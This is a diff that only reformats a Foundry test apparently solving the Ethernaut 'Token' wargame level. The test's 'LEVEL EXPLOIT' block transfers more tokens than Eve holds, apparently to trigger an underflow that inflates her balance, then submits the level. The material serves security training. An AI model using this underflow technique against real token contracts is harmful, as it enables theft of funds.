@@ -67,37 +67,26 @@ contract TokenTest is Test {
         Token tokenContract = Token(levelAddress);
 
         emit log_named_address("Eve's address: ", address(eve));
-        emit log_named_uint(
-            "Eve's balance of tokens (before): ",
-            tokenContract.balances(eve)
-        );
+        emit log_named_uint("Eve's balance of tokens (before): ", tokenContract.balances(eve));
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
         emit log_string("Starting the exploit... 🧨");
-        uint amount = 21;
+        uint256 amount = 21;
         address callAddress = address(0x123);
-        emit log_named_address(
-            "Calling transfer with the address of: ",
-            callAddress
-        );
+        emit log_named_address("Calling transfer with the address of: ", callAddress);
         emit log_named_uint("Calling transfer with the _value of: ", amount);
         tokenContract.transfer(callAddress, amount);
 
-        emit log_named_uint(
-            "Eve's balance of tokens (after): ",
-            tokenContract.balances(eve)
-        );
+        emit log_named_uint("Eve's balance of tokens (after): ", tokenContract.balances(eve));
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
         //////////////////////////////////////////////////////////////*/
 
-        bool challengeCompleted = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(challengeCompleted);
     }
@@ -115,9 +104,7 @@ contract TokenTest is Test {
      * an address for that person
      */
     function makeNameForAddress(string memory name) public returns (address) {
-        address addr = address(
-            uint160(uint256(keccak256(abi.encodePacked(name))))
-        );
+        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
         vm.label(addr, name);
         return addr;
     }
